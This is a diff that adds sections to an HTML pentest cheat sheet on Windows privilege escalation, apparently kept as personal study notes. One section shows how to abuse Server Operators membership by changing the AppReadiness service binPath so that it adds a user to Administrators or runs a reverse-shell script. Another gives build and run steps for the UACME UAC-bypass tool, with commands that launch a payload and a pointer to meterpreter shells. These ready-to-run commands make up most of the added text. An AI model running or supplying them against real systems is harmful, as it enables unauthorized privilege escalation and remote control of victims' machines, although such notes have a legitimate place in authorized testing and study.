@@ -443,6 +443,20 @@ reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></p
                         
                     </ul>
 
+                    <h3>Server Operators</h3>
+                    <ul>
+                    <p>This group allows all members to administer Windows Servers without needing assignment of Domain Admin privileges</p>
+                    <p>Members of this group have <b>SeBackupPrivilege</b> and <b>SeRestorePrivilege</b></p>
+                    <p>We can use the AppReadiness Service in order to escalate our privileges since this service starts as SYSTEM. We can check it by using <b>sc qc AppReadiness</b> as we see it is started by SYSTEM as we can see in the parameter SERVICE_START_NAME</p>
+                    <p>We can also check our permissions over the <b>AppReadiness</b> service by doing</p>
+                    <pre><code class="language-powershell">c:\Tools\PsService.exe security AppReadiness #Sysinternals tool, may not be available</code></pre>
+                    <p>In order to execute any command as system we can change the binary path</p>
+                    <pre><code class="language-powershell">sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"  #We can add another user in the Administrators group
+sc config AppReadiness binPath= "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Users\server_adm\Desktop\shell.ps1" #Perform a reverse shell connection</code></pre>
+                    </ul>
+                </ul>   
+                
+
                     <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
                         <h3>Adding users to groups</h3>
@@ -644,7 +658,52 @@ mimikatz # sekurlsa::credman  </code></pre>
 
                     <h2 id="Bypassing UAC">Bypassing UAC</h2>
                     <ul>
-                        <p>In case you would like to escalate privileges and have access to windows UI you could start msconfig and then spawn a terminal by using the tools. This terminal will be an admin terminal</p>
+                        <h3>msconfig method</h3>
+                        <ul>
+                            <p>In case you would like to escalate privileges and have access to windows UI you could start msconfig and then spawn a terminal by using the tools. This terminal will be an admin terminal</p>
+                        </ul>
+                        
+                        <h3>UACme</h3>
+                        <ul>
+                        <p>There are other sofisticated methods to escalete privileges bypasing the UAC one of them in the <a class="notion-link" href="https://github.com/hfiref0x/UACME?tab=readme-ov-file#build-instructions">uacme project</a> which contains a lot of differents methods to bypass the UAC</p>
+                        <p>In order to use it we must compile it using visual studio code, the described process can be found below</p>
+                        <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>After everything you can follow the tutorial in the following <a class="notion-link" href="https://www.youtube.com/watch?v=iOEaKEb9lOE&t=125s">link</a></p>
+                                    <p>Download the files from the releases section of the github repository</p>
+                                    <p>Then open the .sln file with visual studio. Inside you'll see the following file structure</p>
+                                    <pre><code class="language-powershell">NanoDesu/
+    ├── Akatsuki
+    └── Fubuki
+    └── Naka
+   
+    Akagi
+    Yuubari</code></pre>    
+                                   
+                                    <p>We need to compile Akatsuki, Fabuki and Naka by right clicking on it and selecting build (first option). <b>Make sure you have selected the Release option and the architecture needed</b></p> 
+                                    <pre><code class="language-powershell">Akatsuki - Build x64
+Fubuki - Build x64 and win32
+Naka - Build x64</code></pre>        
+                                    <p>Now go the compile location of Naka <b>(UACME-3.6.9\Source\Naka\output\x64\Release)</b> open a CMD and execute the naka64.exe passing the paths of the dll generated previously in the compilations</p>        
+                                    <pre><code class="language-powershell">Naka64.exe "C:\UACME-3.6.9\Source\Akatsuki\output\x64\Release\Akatsuki64.dll"
+Naka64.exe "C:\UACME-3.6.9\Source\Fubuki\output\x64\Release\Fubuki64.dll"
+Naka64.exe "C:\UACME-3.6.9\Source\Fubuki\output\Win32\Release\Fubuki32.dll"
+Naka64.exe "C:\UACME-3.6.9\Source\Kamikaze\Kamikaze.msc"</code></pre>
+                                    <p>Then run</p>    
+                                    <pre><code class="language-powershell">Naka64.exe --stable</code></pre>
+                                    <p>This will generate some files  (*.cd *.key *.bin) which we need to copy in <b>C:\UACME-3.6.9\Source\Akagi\bin\</b> the files to copy are the following</p>
+                                    <pre><code class="language-powershell">Akatsuki64.cd
+Fubuki32.cd
+Fubuki64.cd
+Kamikaze.cd
+secrets32.bin
+secrets64.bin</code></pre>
+                                    <p>Once copied go to visual studio and build akagi by right clicing and selecting build just like in the previous steps. This will generate the akagi64.exe  located in (<b>C:\UACME-3.6.9\Source\Akagi\output\x64\Release\)</b> </p>     
+                                </div>
+                                <p>Once you have the compiled exe transfer all the folder to the victim <b>(C:\UACME-3.6.9\Source\Akagi\output\x64\Release)</b> and execute the akagi32.exe passing the id of the UAC bypass method here are some examples</p>
+                                <pre><code class="language-powershell">akagi32.exe 23 #By itself it opens a shell with same user but with full privileges you can the user impersonate
+akagi32.exe 23 C:\Users\sarah\Desktop\shell.exe #You can also use it to execute files as admin in that case it is recommended to generate a msfvenom payload and get a meterpreter shell </code></pre>    
+                                </ul>
                     </ul>
 
                     <h2 id="Pass the ticket">Pass the ticket</h2>
